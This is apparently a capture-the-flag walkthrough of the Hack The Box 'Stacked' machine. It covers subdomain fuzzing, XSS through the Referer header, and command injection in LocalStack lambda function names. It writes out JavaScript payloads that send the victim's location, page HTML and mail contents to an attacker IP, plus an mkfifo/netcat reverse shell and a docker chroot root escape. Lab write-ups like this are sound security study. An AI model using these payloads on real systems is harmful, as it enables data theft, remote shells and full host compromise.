I had two ports open: 22 and 80. At the moment SSH didn't work for me, so I looked at the web server.
```

### Puerto 80

![0](https://user-images.githubusercontent.com/69093629/162542058-fe18f6f0-716c-4253-abd3-60aeeaab11fe.png)

Towards a *Redirect* to `stacked.htb`, *Virtual Hosting* was being applied: hosting different domains on the same IP address.

In order to access this domain, I included `stacked.htb` in `/etc/hosts` making it point to `10.10.11.159`.

![0](https://user-images.githubusercontent.com/69093629/162542270-ae82e720-1466-44f2-bdef-dc3fc38d2194.png)

Now I could see what I had.

Apparently it was a counter, nothing interesting, I tried injections in the 'email' field but it was not vulnerable.

## Fuzzing

I did *fuzzing* with `wfuzz` to find directories:

It found some directories for me, but they weren't important, I fuzzed subdomains using the `Host` header and it found `portfolio`.

![0](https://user-images.githubusercontent.com/69093629/162550002-16eef189-6205-43c6-8c1e-52282cdb93ac.png)

I included it in the `/etc/hosts`.

#### portfolio.stacked.htb

![0](https://user-images.githubusercontent.com/69093629/162542732-9c3901c1-9047-40ce-b6f4-1df84725f3db.png)

This page had three sections: Portfolio, About and Contact, all of which were on the same page.

In About I found a download button for a file called `docker-compose.yml`.

![0](https://user-images.githubusercontent.com/69093629/162542894-b9b79211-04e1-4522-a163-bacc6455934b.png)

This is a YAML file where volumes, networks and services are usually defined, this was its content:

```yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
```

Apparently it was mounted locally on AWS, this caught my attention so I left it in the background.

### XSS

In the Contact section I found a form.

![0](https://user-images.githubusercontent.com/69093629/162543455-4c6edddd-e327-4759-a6ce-92c0c9b12815.png)

This could be vulnerable to XSS, I tried injecting `<script>alert("XSS")</script>` but this detected it.

![0](https://user-images.githubusercontent.com/69093629/162543579-8ff0f5cc-1ec7-4109-8f77-f7e2f524d799.png)

At this point I decided to intercept the request with Burp to do `debugging` on the request headers.

![0](https://user-images.githubusercontent.com/69093629/162543854-eafd3002-bf61-4fe9-902b-cffbf56da691.png)

I opened a server with Python on port 80 and tried to inject `<script src="http://10.10.16.59/"></script>` into the *Referer* header.

![0](https://user-images.githubusercontent.com/69093629/162544074-7662d07d-a39b-4eb3-92d7-27fc34889e63.png)

And after a small time interval I received a GET request to my server from the victim machine.

![0](https://user-images.githubusercontent.com/69093629/162544209-25b5969e-960e-47f5-8099-b79d0452d602.png)

The *Referer* header was vulnerable to XSS.

### Strategy

My idea was to identify if the server had interaction with any user, so I created a small JS script with the following content:

```js
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://10.10.16.59:9999/" + document.location, false);
oReq.send();
```

What I was going to do is send a GET request to my `nc` session on port 9999 with the path the user was on at that time.

I opened a Python server on port 8000 hosting `request-3.js` and pointed it to my JS file from the XSS.

![0](https://user-images.githubusercontent.com/69093629/162544871-e17b5ff2-1cb8-45cc-9a31-b43604991314.png)

I waited for a while and received a connection to my `nc` session which contained a route.

![0](https://user-images.githubusercontent.com/69093629/162544592-0e724ada-b7ed-499c-a487-1fbe20a7f167.png)

It appears the user was on `mail.stacked.htb`. This subdomain was not found by `wfuzz` because it was running locally on the machine and had no external access to it.

The next step was to download the HTML from `http://mail.stacked.htb/read-mail.php?id=7` and store it in `index.html`.

What I did was create another script in JS with the following code:

```js
var oReq = new XMLHttpRequest();
oReq.open("POST", "http://10.10.16.59:5555/", false);
oReq.send(document.documentElement.outerHTML);
```

What this does is send a POST request to my netcat session with the HTML code of the page the user was on through port `5555` and store this in a file called `index.html`.

I pointed to my JS file named `request.js` from the XSS and received a connection to my `nc` session.

### Attack scheme:

![Diagrama en blanco](https://user-images.githubusercontent.com/69093629/162549694-f2646995-76e5-4b23-96ff-710ee65c508d.png)

This was the page with the user's HTML code.

![webservidor2](https://user-images.githubusercontent.com/69093629/162546326-2b628a81-cecf-40d4-a34e-d1587a2ec2cb.png)

There was a user named `Jeremy Taint` with a hyperlink that redirected you to `/read-mail.php?id=1`:

![0](https://user-images.githubusercontent.com/69093629/162546383-87e5e3a6-7cdc-43fb-a192-65bfca15d8f6.png)

This caught my attention, so I decided to download the corresponding HTML with the following JS code:

```js
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://mail.stacked.htb/read-mail.php?id=1", false);
oReq.send();

var response = oReq.responseText;

var resp = new XMLHttpRequest();
resp.open("POST", "http://10.10.16.59:5555/", false);
resp.send(response);
```

This sends a GET request to `http://mail.stacked.htb/read-mail.php?id=1` from the user instance, stores the response in `response`, and makes another POST request to my `nc` session with the contents of the `response` variable.

I pointed to my JS file from the XSS and got a connection via `nc`, opened a server via Python and saw that I had this second page.

Había un mensaje: *Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks*.

This said to configure the S3 instance to `s3-testing.stacked.htb`, this was a new subdomain that I didn't have, so I added it to `/etc/hosts`.

![0](https://user-images.githubusercontent.com/69093629/162547200-0e4ff1cc-fa24-4b70-9d47-42613ce5ab25.png)

### s3-testing.stacked.htb

![s3](https://user-images.githubusercontent.com/69093629/162547229-c2a8df2c-cf15-43b4-b484-8097a51b4b72.png)

Apparently it was an AWS API, seeing this I remembered the `docker-compose.yml` file which contained information about a local AWS service.

Searching for LocalStack vulnerabilities I found the following:

![Screenshot 27](https://user-images.githubusercontent.com/69093629/162548008-b6c6c6da-fc2f-49d8-8e00-fd07ded05450.png)

I could abuse the `functionName` parameter when creating lambda functions to inject my malicious code and thus gain *RCE*. I had connectivity to `s3-testing.stacked.htb` which would allow me to create lambda functions.

After a little searching I found a way to create a lambda function, this could be created in more than one language, but I did it with Node.js.

![0](https://user-images.githubusercontent.com/69093629/162548407-a7edec2c-9895-4e7a-88bd-ed06a3a50fba.png)

Save the following code in a file called `lambda.js`.

```javascript
exports.handler =  async function(event, context) {
  return "Hacked"
}
```

This had to be compressed in ZIP.

![ziplambda](https://user-images.githubusercontent.com/69093629/162548681-e9ed776d-d38f-43c7-839e-241e252323ab.png)

To create the function you had to specify certain parameters.

![0](https://user-images.githubusercontent.com/69093629/162548779-ede0739e-2266-4289-b29c-b64d7e9a0f85.png)

Leave all as default except `function-name` and `zip-file`, inject my malicious code into `function-name`, and in `zip-file` the path to the ZIP containing `lambda.js`.

The next step was to use `awscli` to interact with the API and thus create my lambda function.

![0](https://user-images.githubusercontent.com/69093629/162548887-87615e4f-c452-4034-b658-bf520ac56df8.png)

My lambda function was created, but I had to invoke it, so I used the `invoke` parameter specifying `function-name` and exporting the result in a file called `output`.

![0](https://user-images.githubusercontent.com/69093629/162548957-73e9d679-a8a5-49fc-b4b4-ef37401a9ced.png)

### RCE

Remote command execution only happened if the user visited the `dashboard`, in the `docker-compose.yml` file I saw that it could be mounted at `http://127.0.0.1:8080/` but I didn't have access to it externally, so I took advantage of the XSS to redirect the user with the `document.location` object.

![0](https://user-images.githubusercontent.com/69093629/162549411-2edc91d7-7d62-4a61-9019-ca3bd11290f1.png)

Some time later I received a GET request to my server.

![0](https://user-images.githubusercontent.com/69093629/162549109-72c7e9a8-04e1-4ff1-aaff-2c8c83b68a8e.png)

I already had remote command execution, now I just needed to gain access to the machine, so I concatenated a reverse shell with `mkfifo`.

![0](https://user-images.githubusercontent.com/69093629/162549320-3291c746-de1a-4597-98ea-7b48e42bde57.png)

Invoke the function, redirect the user, and get a shell in a container.

![0](https://user-images.githubusercontent.com/69093629/162549540-b85922a2-7f19-4cba-a367-6308123a7dab.png)

### user.txt

I could now see the user's *flag*.

![usetxt](https://user-images.githubusercontent.com/69093629/162549771-afb6a3bf-1c50-4db6-980a-78a9af2799aa.png)

### ESCALATION OF PRIVILEGES

For privilege escalation I transferred myself to `pspy64` and watched the tasks running at regular time intervals.

I saw that Docker was running by concatenating the `--handler` parameter when creating the lambda function, so if I created my function by adding `$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.59 443 >/tmp/f)` it was very likely to run the command and gain me `root` access via `nc` in the container.

![shellcomorootencontentedor](https://user-images.githubusercontent.com/69093629/162550680-a2f79325-d58c-4443-9d8f-0e2f3d6bfc86.png)

Now I could run the `docker` command with sudo, I went to `gtfobins`.

![Captura de pantalla 28](https://user-images.githubusercontent.com/69093629/162550803-31a19264-9028-4e15-9b6d-b353e12a5618.png)

Use the command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` to create a root mount of the machine at `/mnt`.

### root.txt

I started another reverse shell via netcat and ran a bash on the new `docker` container running, and I could now see the root flag.
